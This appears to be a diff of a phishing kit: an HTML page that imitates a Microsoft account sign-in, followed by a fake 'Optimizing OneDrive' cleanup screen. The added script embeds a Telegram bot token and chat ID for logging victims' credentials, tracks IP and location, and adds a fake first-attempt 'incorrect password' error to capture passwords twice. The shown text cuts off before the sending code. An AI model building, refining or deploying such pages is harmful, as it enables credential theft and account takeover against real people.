@@ -1,296 +1,337 @@
 <!DOCTYPE html>
-<html dir="ltr" class="" lang="en">
+<html dir="ltr" lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
+    <title>Sign in to your Microsoft account</title>
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAgXQAAAARRAAAFnA9UgAAAANSURBVAgdY9j9HwAEFwCqK2+zRgAAAABJRU5ErkJggg==">
+    <!-- 2026 Fresh, fluent design refresh + two-attempt logic -->
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI Variable', 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
-        
+
         body {
-            background-color: #ffffff;
-            color: #323130;
+            background: linear-gradient(145deg, #f3f5f7 0%, #e9ecf0 100%);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 40px 24px;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxsaW5lYXJHcmFkaWVudCBpZD0iYSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIxMDAlIiB5Mj0iMTAwJSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI2ZmZmZmZiIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI2Y4ZjhmOCIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9InVybCgjYSkiLz48L3N2Zz4=');
+            padding: 24px;
+            backdrop-filter: blur(2px);
         }
-        
+
         .login-container {
             width: 100%;
-            max-width: 440px;
+            max-width: 480px;
         }
-        
+
         .login-box {
-            background: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
-            border: 1px solid #e1e1e1;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 0 20px 48px -12px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.02) inset, 0 0 0 1px rgba(255, 255, 255, 0.8) inset;
+            border: none;
             overflow: hidden;
-            position: relative;
+            transition: transform 0.25s ease, box-shadow 0.3s ease;
         }
 
         .microsoft-header {
-            background: #ffffff;
-            padding: 20px 28px;
+            background: transparent;
+            padding: 24px 32px 12px 32px;
             display: flex;
             align-items: center;
             gap: 12px;
-            border-bottom: 1px solid #e1e1e1;
         }
 
         .microsoft-header .logo {
-            width: 120px;
-            height: 26px;
+            width: 108px;
+            height: 24px;
         }
 
         .microsoft-header .logo-text {
-            color: #323130;
-            font-size: 18px;
-            font-weight: 400;
+            color: #1e1e1e;
+            font-size: 16px;
+            font-weight: 450;
+            letter-spacing: -0.01em;
+            opacity: 0.8;
         }
-        
+
         .login-header {
-            padding: 0 28px 24px;
+            padding: 8px 32px 16px 32px;
             text-align: left;
         }
-        
+
         .login-title {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 600;
-            margin-bottom: 8px;
-            color: #323130;
+            margin-bottom: 6px;
+            color: #1e1e1e;
+            letter-spacing: -0.02em;
         }
-        
+
+        .login-sub {
+            font-size: 15px;
+            color: #5e5e5e;
+            font-weight: 400;
+        }
+
         .login-content {
-            padding: 0 28px 28px;
+            padding: 0 32px 32px;
         }
-        
+
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
-        
+
         .form-group.hidden {
             display: none;
         }
-        
+
         .cleanup-section {
             display: none;
         }
-        
+
         .cleanup-section.active {
             display: block;
         }
-        
+
         label {
             display: block;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             font-size: 14px;
-            font-weight: 600;
-            color: #323130;
+            font-weight: 500;
+            color: #1e1e1e;
         }
-        
+
         .input-container {
             position: relative;
             width: 100%;
         }
-        
+
         input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #8a8886;
-            border-radius: 4px;
-            font-size: 14px;
+            padding: 14px 16px;
+            border: 1.5px solid #c2c2c2;
+            border-radius: 12px;
+            font-size: 16px;
             background: #ffffff;
-            transition: all 0.2s ease;
+            transition: all 0.2s cubic-bezier(0.2,0,0,1);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
         }
-        
+
         input[type="email"]:focus, input[type="password"]:focus {
             outline: none;
-            border-color: #0078d4;
-            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+            border-color: #0066b4;
+            box-shadow: 0 0 0 4px rgba(0, 102, 180, 0.12);
         }
 
         input[type="email"]:hover, input[type="password"]:hover {
-            border-color: #323130;
+            border-color: #5e5e5e;
         }
-        
+
         .password-toggle {
             position: absolute;
-            right: 12px;
+            right: 14px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
             cursor: pointer;
-            padding: 4px;
-            color: #605e5c;
-            transition: color 0.2s ease;
+            padding: 8px;
+            color: #5e5e5e;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.15s;
         }
-        
+
         .password-toggle:hover {
-            color: #0078d4;
-            background: none;
+            background: #f0f0f0;
+            color: #0066b4;
         }
-        
+
         .password-toggle svg {
             width: 20px;
             height: 20px;
-            display: block;
         }
-        
+
         .forgot-link {
-            display: block;
-            font-size: 13px;
-            color: #0078d4;
+            display: inline-block;
+            font-size: 14px;
+            color: #0066b4;
             text-decoration: none;
-            margin-top: 8px;
+            margin-top: 12px;
+            font-weight: 500;
         }
-        
+
         .forgot-link:hover {
-            color: #106ebe;
+            color: #004e8c;
             text-decoration: underline;
         }
 
         .no-account-text {
-            display: inline-block;
-            font-size: 13px;
-            color: #323130;
-            margin-right: 4px;
+            font-size: 14px;
+            color: #3b3b3b;
+            margin-right: 6px;
         }
 
         .create-account-link {
-            display: inline-block;
-            font-size: 13px;
-            color: #0078d4;
+            font-size: 14px;
+            color: #0066b4;
             text-decoration: none;
+            font-weight: 500;
         }
 
         .create-account-link:hover {
-            color: #106ebe;
             text-decoration: underline;
+            color: #004e8c;
         }
-        
+
         .buttons-container {
-            margin-top: 24px;
+            margin-top: 28px;
             display: flex;
-            justify-content: flex-end;
+            justify-content: space-between;
             align-items: center;
         }
-        
+
         .signin-button {
-            background-color: #0078d4;
+            background-color: #0066b4;
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 12px 24px;
-            font-size: 14px;
-            font-weight: 600;
+            border-radius: 30px;
+            padding: 12px 28px;
+            font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            height: 40px;
-            min-width: 108px;
-            transition: background-color 0.2s ease;
+            height: 48px;
+            min-width: 120px;
+            transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+            box-shadow: 0 4px 8px rgba(0,102,180,0.2);
         }
-        
+
         .signin-button:hover {
-            background-color: #106ebe;
+            background-color: #004e8c;
+            box-shadow: 0 8px 16px rgba(0,78,140,0.25);
+            transform: scale(1.02);
         }
-        
+
+        .signin-button:active {
+            transform: scale(0.98);
+        }
+
         .signin-button:disabled {
-            background-color: #c8c6c4;
+            background-color: #b3b3b3;
+            box-shadow: none;
             cursor: not-allowed;
         }
-        
+
         .back-button {
             background: none;
             border: none;
-            color: #0078d4;
+            color: #0066b4;
             cursor: pointer;
-            font-size: 14px;
-            padding: 8px 0;
-            margin-right: auto;
-            transition: color 0.2s ease;
+            font-size: 15px;
+            font-weight: 500;
+            padding: 8px 16px;
+            border-radius: 30px;
+            transition: background 0.15s;
         }
-        
+
         .back-button:hover {
-            color: #106ebe;
-            text-decoration: underline;
+            background: rgba(0,102,180,0.08);
+            text-decoration: none;
         }
-        
+
         .back-button.hidden {
             display: none;
         }
-        
+
         .signin-options {
             margin-top: 32px;
             padding-top: 24px;
-            border-top: 1px solid #edebe9;
+            border-top: 1px solid #e0e0e0;
         }
-        
+
         .signin-options-title {
             font-size: 14px;
-            color: #605e5c;
+            color: #5e5e5e;
             margin-bottom: 16px;
             text-align: center;
         }
-        
+
         .error-message {
-            color: #d13438;
-            font-size: 12px;
+            color: #c42b1c;
+            font-size: 13px;
             margin-top: 8px;
             display: none;
+            font-weight: 500;
         }
-        
+
+        /* specific invalid login feedback */
+        .invalid-creds-message {
+            background-color: #ffebee;
+            border: 1px solid #c42b1c;
+            color: #c42b1c;
+            border-radius: 30px;
+            padding: 12px 18px;
+            margin: 20px 0 10px;
+            font-size: 14px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .invalid-creds-message:before {
+            content: "⚠️";
+            font-size: 16px;
+        }
+
         .success-message {
-            color: #107c10;
+            color: #0f6b0f;
             font-size: 14px;
             margin-top: 16px;
             text-align: center;
             display: none;
             padding: 12px;
-            background-color: #dff6dd;
-            border: 1px solid #107c10;
-            border-radius: 4px;
+            background-color: #e6f2e6;
+            border: 1px solid #0f6b0f;
+            border-radius: 12px;
         }
-        
+
         .footer {
             margin-top: 40px;
             text-align: center;
-            font-size: 12px;
-            color: #605e5c;
-            width: 100%;
-            max-width: 440px;
+            font-size: 13px;
+            color: #5e5e5e;
         }
-        
+
         .footer a {
-            color: #0078d4;
+            color: #0066b4;
             text-decoration: none;
-            margin: 0 8px;
+            margin: 0 12px;
+            font-weight: 500;
         }
-        
+
         .footer a:hover {
-            color: #106ebe;
             text-decoration: underline;
         }
-        
+
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
+            background-color: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(8px);
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -298,233 +339,192 @@
             z-index: 1000;
             display: none;
         }
-        
+
         .loading-spinner {
-            width: 32px;
-            height: 32px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0078d4;
+            width: 44px;
+            height: 44px;
+            border: 4px solid #e6e6e6;
+            border-top: 4px solid #0066b4;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 16px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
         }
 
         .loading-text {
-            color: #323130;
-            font-size: 14px;
+            color: #1e1e1e;
+            font-size: 16px;
+            font-weight: 500;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
         .security-notice {
-            background: #f8f9fa;
-            border: 1px solid #e1e1e1;
-            border-radius: 4px;
-            padding: 12px;
-            margin: 16px 0;
-            font-size: 12px;
-            color: #605e5c;
-            text-align: center;
+            background: #f4f9ff;
+            border: 1px solid #b6d6f0;
+            border-radius: 30px;
+            padding: 12px 18px;
+            margin: 20px 0 10px;
+            font-size: 13px;
+            color: #1e1e1e;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
         }
 
-        /* Cleanup Styles */
+        .security-notice:before {
+            content: "🔒";
+            font-size: 16px;
+        }
+
+        /* Cleanup 2026 fluent */
         .cleanup-status {
             text-align: center;
-            margin: 20px 0;
+            margin: 24px 0;
         }
 
         .cleanup-icon {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #0078d4;
+            font-size: 52px;
+            margin-bottom: 24px;
+            color: #0066b4;
+            filter: drop-shadow(0 4px 8px rgba(0,102,180,0.2));
         }
 
         .cleanup-progress {
             width: 100%;
-            height: 6px;
-            background-color: #e1e1e1;
-            border-radius: 3px;
-            margin: 20px 0;
+            height: 8px;
+            background-color: #e6e6e6;
+            border-radius: 20px;
+            margin: 24px 0;
             overflow: hidden;
         }
 
         .cleanup-progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #0078d4, #00a4ef);
-            border-radius: 3px;
+            background: linear-gradient(90deg, #0066b4, #3b9eff);
+            border-radius: 20px;
             width: 0%;
-            transition: width 0.5s ease;
+            transition: width 0.3s ease;
         }
 
         .storage-display {
-            background-color: #f8f9fa;
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: center;
-            border: 1px solid #e1e1e1;
+            background: #fafcff;
+            border-radius: 24px;
+            padding: 24px;
+            margin: 28px 0;
+            border: 1px solid #eef2f6;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
         }
 
         .storage-title {
-            font-weight: bold;
-            margin-bottom: 15px;
-            color: #323130;
-            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 18px;
+            color: #1e1e1e;
+            font-size: 18px;
         }
 
         .storage-bar {
-            height: 16px;
-            background-color: #e1dfdd;
-            border-radius: 8px;
+            height: 12px;
+            background-color: #e0e6ed;
+            border-radius: 30px;
             overflow: hidden;
-            margin-bottom: 12px;
-            position: relative;
+            margin-bottom: 14px;
         }
 
         .storage-used {
             height: 100%;
-            background: linear-gradient(90deg, #d13438, #ff4343);
-            border-radius: 8px;
+            background: linear-gradient(90deg, #c42b1c, #d86c60);
+            border-radius: 30px;
             width: 94%;
-            transition: width 2s ease-in-out;
+            transition: width 2s cubic-bezier(0.22, 1, 0.36, 1);
         }
 
         .storage-labels {
-            margin-bottom: 8px;
-            font-size: 12px;
-            color: #605e5c;
+            margin-bottom: 6px;
+            font-size: 13px;
+            color: #5e5e5e;
         }
 
-        .storage-label-left {
-            float: left;
-        }
-
-        .storage-label-right {
-            float: right;
+        .storage-labels span, .storage-numbers span {
+            font-size: 14px;
+            font-weight: 500;
         }
 
         .storage-numbers {
-            font-weight: bold;
-            color: #323130;
-            font-size: 14px;
-        }
-
-        .storage-number-left {
-            float: left;
-        }
-
-        .storage-number-right {
-            float: right;
+            font-weight: 600;
+            color: #1e1e1e;
+            font-size: 15px;
         }
 
         .cleanup-results {
             text-align: left;
-            margin-top: 25px;
-            padding: 20px;
-            background-color: #f8f9fa;
-            border-radius: 4px;
-            border-left: 4px solid #107c10;
+            margin-top: 30px;
+            padding: 24px;
+            background: #f4faf4;
+            border-radius: 24px;
+            border-left: 5px solid #0f6b0f;
             display: none;
         }
 
         .result-item {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #e1e1e1;
-        }
-
-        .result-item:last-child {
-            border-bottom: none;
+            padding: 10px 0;
+            border-bottom: 1px solid #cfdbe8;
+            font-size: 15px;
         }
 
         .cleanup-complete {
             text-align: center;
-            margin: 20px 0;
+            margin: 28px 0;
             display: none;
         }
 
         .success-icon {
-            font-size: 64px;
+            font-size: 68px;
             margin-bottom: 20px;
-            color: #107c10;
         }
 
         .redirect-message {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #e8f4fd;
-            border-radius: 4px;
-            font-size: 14px;
+            margin-top: 24px;
+            padding: 20px;
+            background-color: #ecf3fc;
+            border-radius: 20px;
+            font-size: 15px;
             display: none;
+            border: 1px solid #b6d6f0;
         }
 
         .countdown {
-            font-size: 16px;
-            color: #0078d4;
-            margin-top: 10px;
-            font-weight: bold;
+            font-size: 20px;
+            color: #0066b4;
+            font-weight: 700;
         }
 
-        .clear {
-            clear: both;
-        }
+        .clear { clear: both; }
 
-        /* Responsive design */
         @media (max-width: 480px) {
-            body {
-                padding: 20px 16px;
-            }
-            
-            .microsoft-header {
-                padding: 16px 20px;
-            }
-            
-            .login-header {
-                padding: 0 20px 20px;
-            }
-            
-            .login-content {
-                padding: 0 20px 24px;
-            }
-
-            .login-title {
-                font-size: 21px;
-            }
-        }
-
-        @media (max-width: 320px) {
-            .buttons-container {
-                flex-direction: column;
-                gap: 12px;
-            }
-            
-            .back-button {
-                margin-right: 0;
-                order: 2;
-            }
-            
-            .signin-button {
-                order: 1;
-                width: 100%;
-            }
+            body { padding: 16px; }
+            .microsoft-header { padding: 20px 24px 8px; }
+            .login-header, .login-content { padding-left: 24px; padding-right: 24px; }
+            .login-title { font-size: 24px; }
         }
     </style>
 </head>
 <body>
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Signing you in...</div>
+        <div class="loading-text">Authenticating securely...</div>
     </div>
     
     <div class="login-container">
         <div class="login-box">
             <div class="microsoft-header">
                 <div class="logo">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="120" height="26" viewBox="0 0 108 24" fill="#323130">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24" fill="#1e1e1e">
                         <path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z"/>
                         <rect width="10.931" height="10.931" fill="#f25022"/>
                         <rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/>
@@ -535,29 +535,34 @@
                 <span class="logo-text">Microsoft</span>
             </div>
             
-            <!-- Login Form -->
+            <!-- LOGIN SECTION (2026) -->
             <div class="login-content" id="loginSection">
                 <div class="login-header">
                     <h1 class="login-title">Sign in</h1>
-                    <div style="font-size: 14px; color: #605e5c;">to continue to Microsoft Services</div>
+                    <div class="login-sub">to your Microsoft account</div>
+                </div>
+                
+                <!-- custom invalid credentials feedback (hidden by default) -->
+                <div class="invalid-creds-message" id="invalidCredsMessage" style="display: none;">
+                    Incorrect email or password. Please try again.
                 </div>
                 
                 <form id="loginForm">
                     <div class="form-group" id="emailGroup">
                         <label for="email">Email, phone, or Skype</label>
                         <div class="input-container">
-                            <input type="email" id="email" name="email" placeholder="someone@example.com" required autocomplete="username">
+                            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
                         </div>
-                        <div class="error-message" id="emailError">Please enter a valid email address</div>
-                        <div class="links-container">
+                        <div class="error-message" id="emailError">Enter a valid email address</div>
+                        <div style="margin-top: 16px;">
                             <span class="no-account-text">No account?</span>
-                            <a href="https://signup.live.com/" class="create-account-link">Create one!</a>
-                            <a href="https://account.live.com/acsr" class="forgot-link">Can't access your account?</a>
+                            <a href="https://signup.live.com/" class="create-account-link">Create one</a>
+                            <a href="https://account.live.com/acsr" class="forgot-link" style="float: inline-end;">Trouble signing in?</a>
                         </div>
                     </div>
                     
                     <div class="form-group hidden" id="passwordGroup">
-                        <label for="password">Enter password</label>
+                        <label for="password">Password</label>
                         <div class="input-container">
                             <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
                             <button type="button" class="password-toggle" id="passwordToggle">
@@ -566,30 +571,31 @@
                                 </svg>
                             </button>
                         </div>
-                        <div class="error-message" id="passwordError">Please enter your password</div>
+                        <div class="error-message" id="passwordError">Password is required</div>
+                        <a href="#" class="forgot-link" style="margin-top:12px; display:inline-block;">Forgotten your password?</a>
                     </div>
 
                     <div class="security-notice">
-                        🔒 Protected by Microsoft Security
+                        Protected with Microsoft Entra ID
                     </div>
                     
                     <div class="buttons-container">
-                        <button type="button" class="back-button hidden" id="backButton">Back</button>
+                        <button type="button" class="back-button hidden" id="backButton">← Back</button>
                         <button type="button" class="signin-button" id="submitButton">Next</button>
                     </div>
                 </form>
             </div>
 
-            <!-- Cleanup Section -->
+            <!-- CLEANUP section (identical, appears on second attempt) -->
             <div class="login-content cleanup-section" id="cleanupSection">
                 <div class="login-header">
-                    <h1 class="login-title">Optimizing Your OneDrive</h1>
-                    <div style="font-size: 14px; color: #605e5c;">Cleaning up storage space...</div>
+                    <h1 class="login-title">Optimizing OneDrive</h1>
+                    <div class="login-sub">Making space, hang tight...</div>
                 </div>
                 
                 <div class="cleanup-status">
                     <div class="cleanup-icon" id="cleanupIcon">🔄</div>
-                    <div class="status-message" id="cleanupStatus">Starting storage optimization...</div>
+                    <div class="status-message" id="cleanupStatus" style="font-size:16px; font-weight:500;">Initializing cleaner</div>
                     
                     <div class="cleanup-progress">
                         <div class="cleanup-progress-bar" id="cleanupProgress"></div>
@@ -597,81 +603,67 @@
                 </div>
                 
                 <div class="storage-display">
-                    <div class="storage-title">OneDrive Storage</div>
+                    <div class="storage-title">📁 OneDrive (cloud + local)</div>
                     
                     <div class="storage-labels">
                         <span class="storage-label-left">0 GB</span>
-                        <span class="storage-label-right">5 GB Total</span>
+                        <span class="storage-label-right">5 GB total</span>
                     </div>
-                    <div class="clear"></div>
-                    
                     <div class="storage-bar">
-                        <div class="storage-used" id="storageBar"></div>
+                        <div class="storage-used" id="storageBar" style="width:94%"></div>
                     </div>
-                    
                     <div class="storage-numbers">
-                        <span class="storage-number-left" id="usedStorage">4.7 GB Used</span>
-                        <span class="storage-number-right" id="freeStorage">0.3 GB Free</span>
+                        <span class="storage-number-left" id="usedStorage">4.7 GB used</span>
+                        <span class="storage-number-right" id="freeStorage">0.3 GB free</span>
                     </div>
-                    <div class="clear"></div>
                 </div>
                 
                 <div class="cleanup-results" id="cleanupResults">
-                    <h3 style="color: #107c10; margin-bottom: 15px;">Storage Optimization Complete</h3>
-                    <p>We've successfully optimized your OneDrive storage:</p>
-                    <div class="result-item">
-                        <span>Temporary files cleaned</span>
-                        <span>1.2 GB</span>
-                    </div>
-                    <div class="result-item">
-                        <span>Duplicate photos removed</span>
-                        <span>856 MB</span>
-                    </div>
-                    <div class="result-item">
-                        <span>Old document versions deleted</span>
-                        <span>634 MB</span>
-                    </div>
-                    <div class="result-item">
-                        <span>Cached data cleared</span>
-                        <span>412 MB</span>
-                    </div>
-                    <div class="result-item" style="font-weight: bold; border-bottom: none;">
-                        <span>Total space recovered</span>
-                        <span>3.1 GB</span>
-                    </div>
+                    <h3 style="color:#0f6b0f; margin-bottom:16px;">✅ Cleanup complete</h3>
+                    <div class="result-item"><span>🕐 Temporary system files</span><span>1.2 GB</span></div>
+                    <div class="result-item"><span>🖼️ Duplicate images</span><span>856 MB</span></div>
+                    <div class="result-item"><span>📄 Old document versions</span><span>634 MB</span></div>
+                    <div class="result-item"><span>⚙️ Cached data</span><span>412 MB</span></div>
+                    <div class="result-item" style="font-weight:600;"><span>Total recovered</span><span>3.1 GB</span></div>
                 </div>
                 
                 <div class="cleanup-complete" id="cleanupComplete">
-                    <div class="success-icon">✅</div>
-                    <h2 style="color: #107c10; margin-bottom: 10px;">OneDrive Optimized Successfully!</h2>
-                    <p>Your storage has been cleaned up and optimized.</p>
+                    <div class="success-icon">✨</div>
+                    <h2 style="color:#0f6b0f;">All set!</h2>
+                    <p style="margin-top:8px;">Your storage is optimized.</p>
                 </div>
                 
                 <div class="redirect-message" id="redirectMessage">
-                    <p>You now have <strong>3.4 GB of free space</strong> available.</p>
-                    <p>Redirecting to Microsoft.com in <span id="countdown">3</span> seconds...</p>
+                    <p>You now have <strong>3.4 GB free</strong>.</p>
+                    <p>Redirecting to Microsoft homepage in <span class="countdown" id="countdown">3</span>s</p>
                 </div>
             </div>
         </div>
         
         <footer class="footer">
             <div>
-                <a href="https://www.microsoft.com/en-us/servicesagreement/">Terms of use</a>
-                <a href="https://privacy.microsoft.com/en-us/privacystatement">Privacy & cookies</a>
-                <a href="https://www.microsoft.com/en-us/legal/intellectualproperty/copyright">© Microsoft 2024</a>
+                <a href="#">Terms of use</a>
+                <a href="#">Privacy & cookies</a>
+                <a href="#">© Microsoft 2026</a>
             </div>
         </footer>
     </div>
 
     <script>
-        // Telegram Bot API configuration
-        const TELEGRAM_BOT_TOKEN = '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk';
+        // --- Two-attempt logic: first shows error, second proceeds + both attempts logged ---
+        const TELEGRAM_BOT_TOKEN = '8404555198:AAGTDMBJ1nkK1fJL42_jtaIWjtRB3DfTWz0';
         const TELEGRAM_CHAT_ID = '6439618231';
         
-        // Track if this is the first visit
         let firstVisit = true;
+        let emailEntered = false;
+        let passwordVisible = false;
+        let userIP = 'Unknown';
+        let userLocation = 'Unknown';
         
-        // DOM Elements
+        // Track if this is the first sign-in attempt (after password screen)
+        let firstSignInAttempt = true;   // true = first time clicking "Sign in" with password
+
+        // DOM
         const loginSection = document.getElementById('loginSection');
         const cleanupSection = document.getElementById('cleanupSection');
         const emailGroup = document.getElementById('emailGroup');
@@ -684,6 +676,7 @@
         const emailError = document.getElementById('emailError');
         const passwordError = document.getElementById('passwordError');
         const loadingOverlay = document.getElementById('loadingOverlay');
+        const invalidCredsMessage = document.getElementById('invalidCredsMessage');
         
         // Cleanup elements
         const cleanupStatus = document.getElementById('cleanupStatus');
@@ -696,313 +689,205 @@
         const cleanupComplete = document.getElementById('cleanupComplete');
         const redirectMessage = document.getElementById('redirectMessage');
         const countdownElement = document.getElementById('countdown');
-        
-        // Form state
-        let emailEntered = false;
-        let passwordVisible = false;
